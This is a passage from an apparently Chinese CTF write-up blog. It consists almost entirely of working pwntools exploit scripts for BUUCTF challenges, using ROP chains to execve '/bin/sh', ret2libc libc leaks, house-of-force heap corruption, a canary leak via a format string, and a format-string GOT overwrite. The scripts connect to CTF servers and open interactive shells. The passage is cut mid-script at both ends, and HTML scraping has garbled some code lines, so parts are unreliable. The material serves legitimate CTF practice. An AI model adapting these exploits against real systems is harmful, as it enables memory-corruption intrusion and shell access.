class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf1 = ELF("__stkof")</span><br><span class="line">elf2 = ELF("_stkof")</span><br><span class="line">sh1 = 0</span><br><span class="line">sh2 = 0</span><br><span class="line">def rop32():</span><br><span class="line">	p = ''</span><br><span class="line">	p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">	p += pack('<i', 0x080d9060) # @ .data< span><br><span class="line">	p += pack('<i', 0x080a8af6) # pop eax ; ret< span><br><span class="line">	p += '/bin'</span><br><span class="line">	p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">	p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">	p += pack('<i', 0x080d9064) # @ .data + 4< span><br><span class="line">	p += pack('<i', 0x080a8af6) # pop eax ; ret< span><br><span class="line">	p += '//sh'</span><br><span class="line">	p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">	p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">	p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">	p += pack('<i', 0x08056040) # xor eax, eax ; ret< span><br><span class="line">	p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">	p += pack('<i', 0x080481c9) # pop ebx ; ret< span><br><span class="line">	p += pack('<i', 0x080d9060) # @ .data< span><br><span class="line">	p += pack('<i', 0x0806e9f2) # pop ecx ; ebx ret< span><br><span class="line">	p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">	p += pack('<i', 0x080d9060) # padding without overwrite ebx< span><br><span class="line">	p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">	p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">	p += pack('<i', 0x08056040) # xor eax, eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">	p += pack('<i', 0x080495a3) # int 0x80< span><br><span class="line">	return p</span><br><span class="line">def rop64():</span><br><span class="line">	p = ''</span><br><span class="line">	p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006a10e0) # @ .data< span><br><span class="line">	p += pack('<q', 0x000000000043b97c) # pop rax ; ret< span><br><span class="line">	p += '/bin//sh'</span><br><span class="line">	p += pack('<q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">	p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x0000000000436ed0) # xor rax, rax ; ret< span><br><span class="line">	p += pack('<q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">	p += pack('<q', 0x00000000004005f6) # pop rdi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006a10e0) # @ .data< span><br><span class="line">	p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x000000000043b9d5) # pop rdx ; ret< span><br><span class="line">	p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">	p += pack('<q', 0x0000000000436ed0) # xor rax, rax ; ret< span><br><span class="line">	p += pack('<q', 1 0x000000000040e09f) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 1 0x00000000004610a0) # add rax, ; ret< span><br><span class="line">	p += pack('<q', 0x0000000000461645) # syscall ; ret< span><br><span class="line">	return p</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh1</span><br><span class="line">	global sh2</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		#sh1 = process("./__stkof")</span><br><span class="line">		sh2 = process("./_stkof")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	offset1  = 272</span><br><span class="line">	payload  = offset1 * 'a'</span><br><span class="line">	payload += p32(0x0806b225)</span><br><span class="line">	offset2  = 256</span><br><span class="line">	payload += p32(0) + rop64()</span><br><span class="line">	payload  = payload.ljust(offset1 + offset2 + 4,'a')</span><br><span class="line">	payload += rop32()</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("node1.buuoj.cn",28669,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></pre></td></tr></tbody></table></figure></div>


<h2 id="0x41-ciscn-2019-ne-3"><a href="#0x41-ciscn-2019-ne-3" class="headerlink" title="0x41 ciscn_2019_ne_3"></a>0x41 ciscn_2019_ne_3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_ne_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_ne_3")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">	pop_ebx_ret = 0x08048431</span><br><span class="line">	pop_ebp_ret = 0x0804881b</span><br><span class="line">	pop3_ret = 0x08048819</span><br><span class="line">	leave_ret = 0x08048575</span><br><span class="line">	base = 0x0804A800</span><br><span class="line">	sh.recvuntil("name?")</span><br><span class="line">	sh.send("a" * 9)</span><br><span class="line">	sh.recvuntil("password:")</span><br><span class="line">	sh.send("-1\x00\x00"+ p32(0x08048793) + p32(0x0804A060) + p32(0x500))</span><br><span class="line">	sh.recvuntil("):")</span><br><span class="line">	offset   = 56 + 4 * 4</span><br><span class="line">	payload  = offset * 'a'</span><br><span class="line">	payload += p32(0x0804A064 + 4)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload  = p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">	payload += p32(pop_ebp_ret) + p32(base) + p32(leave_ret) </span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	payload  = p32(0) + p32(elf.plt['puts']) + p32(pop_ebx_ret) + p32(elf.got['__libc_start_main'])</span><br><span class="line">	payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	__libc_start_main = u32(sh.recv(4))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload = p32(0)*3 + p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20169,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x42-bcloud-bctf-2016"><a href="#0x42-bcloud-bctf-2016" class="headerlink" title="0x42 bcloud_bctf_2016"></a>0x42 bcloud_bctf_2016</h2><h3 id="典型的house-of-force"><a href="#典型的house-of-force" class="headerlink" title="典型的house of force"></a>典型的house of force</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bcloud_bctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if size > 0:</span><br><span class="line">		sh.recvuntil(":")</span><br><span class="line">		sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">>")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./bcloud_bctf_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send("b" * 0x40)</span><br><span class="line">	sh.recvuntil("b" * 0x40)</span><br><span class="line">	heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">	topChunk = heap_base + 0xd8</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.send(0x40 * "a")</span><br><span class="line">	sh.recvuntil(":")</span><br><span class="line">	sh.sendline("\xff" * 0x4)</span><br><span class="line">	notesize_addr = 0x0804B0A0</span><br><span class="line">	notelist_addr = 0x0804B120</span><br><span class="line">	add(notesize_addr - topChunk - 0x10,'')</span><br><span class="line">	payload = p32(0x400) * 10</span><br><span class="line">	payload = payload.ljust(0x0804B120 - 0x0804B0A0,'\x00')</span><br><span class="line">	payload += p32(elf.got['free'])</span><br><span class="line">	payload += p32(notesize_addr)</span><br><span class="line">	payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">	add(0x400,payload + "\n")</span><br><span class="line">	edit(0,p32(elf.plt['puts']) + "\n")</span><br><span class="line">	free(2)</span><br><span class="line">	__libc_start_main = u32(sh.recvuntil('\xf7')[-4:])</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	edit(0,p32(system) + "\n")</span><br><span class="line">	edit(1,payload + p32(binsh) + "\n")</span><br><span class="line">	free(3)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20020,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x43-web-of-sci-volga-2016"><a href="#0x43-web-of-sci-volga-2016" class="headerlink" title="0x43 web_of_sci_volga_2016"></a>0x43 web_of_sci_volga_2016</h2><h3 id="leak-canary，然后普通的ROP"><a href="#leak-canary，然后普通的ROP" class="headerlink" title="leak canary，然后普通的ROP"></a>leak canary，然后普通的ROP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("web_of_sci_volga_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./web_of_sci_volga_2016")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	pop_rdi_ret = 0x4010a3</span><br><span class="line">	pop_rsi_r15_ret = 0x4010a1</span><br><span class="line">	payload = "\x00"</span><br><span class="line">	sh.recvuntil("name")</span><br><span class="line">	sh.sendline("%43$p")</span><br><span class="line">	sh.recvuntil("0x")</span><br><span class="line">	canary = int(sh.recvuntil(",",True),16)</span><br><span class="line">	for i in range(9):</span><br><span class="line">		sh.recvuntil(":")</span><br><span class="line">		sh.sendline("0")</span><br><span class="line">	offset = 0xa0 + 8</span><br><span class="line">	payload = ''</span><br><span class="line">	payload = payload.ljust(0xa0 - 0x18,'a')</span><br><span class="line">	payload += p64(canary)</span><br><span class="line">	payload = payload.ljust(offset,'a')</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(elf.got['__libc_start_main'])	</span><br><span class="line">	payload += p64(elf.plt['puts'])</span><br><span class="line">	payload += p64(0x400FCD)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(": ")</span><br><span class="line">	__libc_start_main = u64(sh.recvuntil("\x7f").ljust(8,'\x00'))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	sh.recvuntil("name")</span><br><span class="line">	sh.sendline("%43$p")</span><br><span class="line">	sh.recvuntil("0x")</span><br><span class="line">	canary = int(sh.recvuntil(",",True),16)</span><br><span class="line">	for i in range(9):</span><br><span class="line">                sh.recvuntil(":")</span><br><span class="line">                sh.sendline("0")</span><br><span class="line">	offset = 0xa0 + 8</span><br><span class="line">	payload = ''</span><br><span class="line">	payload = payload.ljust(0xa0 - 0x18,'a')</span><br><span class="line">	payload += p64(canary)</span><br><span class="line">	payload = payload.ljust(offset,'a')</span><br><span class="line">	payload += p64(pop_rdi_ret)</span><br><span class="line">	payload += p64(binsh)</span><br><span class="line">	payload += p64(system)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20098,0)</span><br></pre></td></tr></tbody></table></figure></div>


<h2 id="0x44-ciscn-2019-sw-1"><a href="#0x44-ciscn-2019-sw-1" class="headerlink" title="0x44 ciscn_2019_sw_1"></a>0x44 ciscn_2019_sw_1</h2><h3 id="printf花式溢出漏洞，无限循环"><a href="#printf花式溢出漏洞，无限循环" class="headerlink" title="printf花式溢出漏洞，无限循环"></a>printf花式溢出漏洞，无限循环</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_sw_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_sw_1")</span><br><span class="line">		</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	main = 0x08048534</span><br><span class="line">	fini = 0x0804979C</span><br><span class="line">	system_plt = 0x080483D0</span><br><span class="line">	offset = 0</span><br><span class="line">	payload = p32(fini + 2) + p32(fini) + p32(elf.got['printf'] + 2) + p32(elf.got['printf'])</span><br><span class="line">	payload += '%.' + str((main >> 16) - 4 - 5 - 8) + 'd%4$hn'</span><br><span class="line">	payload += '%6$hn'</span><br><span class="line">	payload += "%." + str(system_plt % 0x10000 - (main >> 16)) + "d%7$hn"</span><br><span class="line">	payload += "%." + str(main % 0x10000 - (system_plt % 0x10000)) + "d%5$hn"</span><br><span class="line">	log.success("puts_got: " + hex(elf.got['puts']))</span><br><span class="line">	log.success("fini: " + hex(0x0804979C))</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("/bin/sh\x00")	</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("pwn.buuoj.cn",20127,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x45-中关村2019-one-string"><a href="#0x45-中关村2019-one-string" class="headerlink" title="0x45 [中关村2019]one_string"></a>0x45 [中关村2019]one_string</h2><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">delay = 0.1</span><br><span class="line">data = ''</span><br><span class="line">data2 = ''</span><br><span class="line">def add(size,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    data += base64.b64encode("1")</span><br><span class="line">    data2 += "1\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    data += base64.b64encode(str(size))</span><br><span class="line">    data2 += str(size) + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data += base64.b64encode(content)</span><br><span class="line">    data2 += content + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    data += base64.b64encode("3")</span><br><span class="line">    data2 += "3\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data += base64.b64encode(str(idx))</span><br><span class="line">    data2 += str(idx) + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data += base64.b64encode(content)</span><br><span class="line">    data2 += content + "\n"</span><br><span class="line">def free(idx):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    data2 += "2\n"</span><br><span class="line">    data += base64.b64encode("2")</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data2 += str(idx) + "\n"</span><br><span class="line">    data += base64.b64encode(str(idx))</span><br><span class="line">    sleep(delay)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./pwn_back")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">    malloc_hook = 0x80EA4D8</span><br><span class="line">    chunk_list = 0x080EBA00</span><br><span class="line">    add(0x80,'\x99'*0x64)</span><br><span class="line">    add(0x80,'\x99'*0x64)</span><br><span class="line">    